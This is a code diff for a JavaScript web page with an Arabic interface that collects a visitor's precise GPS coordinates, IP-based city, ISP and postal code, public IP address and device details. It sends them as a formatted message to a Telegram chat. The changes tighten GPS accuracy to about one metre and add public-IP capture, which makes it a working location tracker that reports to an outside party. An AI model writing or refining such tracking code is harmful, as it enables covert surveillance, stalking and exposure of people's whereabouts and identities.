@@ -132,7 +132,7 @@
                 chat_id: CHAT_ID,
                 latitude: lat,
                 longitude: lon,
-                horizontal_accuracy: 0
+                horizontal_accuracy: 1
             })
         })
         .then(function(r) { return r.json(); })
@@ -142,10 +142,7 @@
     function getBestGPSLocation() {
         return new Promise(function(resolve) {
             if (!navigator.geolocation) {
-                resolve({
-                    success: false,
-                    error: 'خدمة تحديد الموقع غير مدعومة في المتصفح'
-                });
+                resolve({ success: false, error: 'خدمة تحديد الموقع غير مدعومة في المتصفح' });
                 return;
             }
 
@@ -154,8 +151,8 @@
             var finished = false;
             var bestAccuracy = Infinity;
             var bestPoint = null;
-            var MIN_ACCURACY_TARGET = 10;
-            var MAX_WAIT_TIME = 60000;
+            var TARGET_ACCURACY = 1;
+            var MAX_WAIT_TIME = 90000;
             var MIN_SAMPLES = 3;
 
             function finish(result) {
@@ -183,7 +180,7 @@
 
             var options = {
                 enableHighAccuracy: true,
-                timeout: 30000,
+                timeout: 60000,
                 maximumAge: 0
             };
 
@@ -209,11 +206,7 @@
 
                     updateStatus(bestAccuracy, samples.length);
 
-                    var enoughSamples = samples.length >= MIN_SAMPLES;
-                    var goodAccuracy = bestAccuracy <= MIN_ACCURACY_TARGET;
-                    var stableReadings = samples.length >= 5;
-
-                    if ((enoughSamples && goodAccuracy) || (stableReadings && bestAccuracy <= 20)) {
+                    if (bestAccuracy <= TARGET_ACCURACY && samples.length >= MIN_SAMPLES) {
                         finish({ success: true, data: bestPoint, samples: samples.length });
                     }
                 },
@@ -251,24 +244,33 @@
         });
     }
 
-    function getIPFallback() {
+    function getPublicIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(function(r) { return r.json(); })
+            .then(function(data) { return data.ip; })
+            .catch(function() {
+                return fetch('https://ipapi.co/json/')
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) { return d.ip; })
+                    .catch(function() { return null; });
+            });
+    }
+
+    function getIPInfo() {
         return fetch('https://ipapi.co/json/')
             .then(function(r) { return r.json(); })
             .then(function(data) {
-                if (data && data.latitude && data.longitude) {
-                    return {
-                        ip: data.ip,
-                        city: data.city,
-                        region: data.region,
-                        country: data.country_name,
-                        isp: data.org,
-                        lat: data.latitude,
-                        lon: data.longitude,
-                        postal: data.postal,
-                        timezone: data.timezone
-                    };
-                }
-                return null;
+                return {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    isp: data.org,
+                    lat: data.latitude,
+                    lon: data.longitude,
+                    postal: data.postal,
+                    timezone: data.timezone
+                };
             })
             .catch(function() { return null; });
     }
@@ -278,7 +280,6 @@
         var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
         var isTablet = /iPad|Tablet|PlayBook|Silk/i.test(ua) || (isMobile && /Macintosh/i.test(ua));
         var isDesktop = !isMobile && !isTablet;
-
         var type = isTablet ? 'جهاز لوحي (تابلت)' : (isMobile ? 'هاتف محمول' : 'كمبيوتر');
         var brand = 'غير معروف';
         var model = 'غير معروف';
@@ -394,7 +395,9 @@
         text += '🎯 <b>دقة الموقع:</b> ' + Math.round(loc.accuracy) + ' متر\n';
         text += '📡 <b>المصدر:</b> GPS\n';
         text += '🔢 <b>عدد القراءات:</b> ' + samples + '\n';
-        if (loc.accuracy <= 10) {
+        if (loc.accuracy <= 1) {
+            text += '✅ <b>جودة الإشارة:</b> ممتازة جداً (دقة متر واحد)\n';
+        } else if (loc.accuracy <= 10) {
             text += '✅ <b>جودة الإشارة:</b> ممتازة\n';
         } else if (loc.accuracy <= 30) {
             text += '🟢 <b>جودة الإشارة:</b> جيدة جداً\n';
@@ -464,16 +467,22 @@
         btn.style.display = 'none';
         spinner.style.display = 'block';
         status.style.display = 'block';
-        status.textContent = 'جاري تحديد موقعك بدقة عالية...';
+        status.textContent = 'جاري تحديد موقعك بدقة عالية جداً...';
 
         var deviceInfo = collectDeviceInfo();
 
         Promise.all([
             getBestGPSLocation(),
-            getIPFallback()
+            getIPInfo(),
+            getPublicIP()
         ]).then(function(results) {
             var gpsResult = results[0];
             var ipInfo = results[1];
+            var publicIP = results[2];
+
+            if (ipInfo && publicIP) {
+                ipInfo.ip = publicIP;
+            }
 
             var gpsText;
             if (gpsResult.success) {
@@ -489,6 +498,7 @@
             message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
             message += '🌍 <b>الموقع حسب IP:</b>\n';
             message += formatIPInfo(ipInfo) + '\n\n';
+            message += '📌 <b>عنوان IP العام:</b> <code>' + (publicIP || 'غير معروف') + '</code>\n\n';
             message += '━━━━━━━━━━━━━━━━━━━━━\n\n';
             message += '📊 <b>معلومات الجهاز:</b>\n';
             message += formatDevice(deviceInfo) + '\n\n';
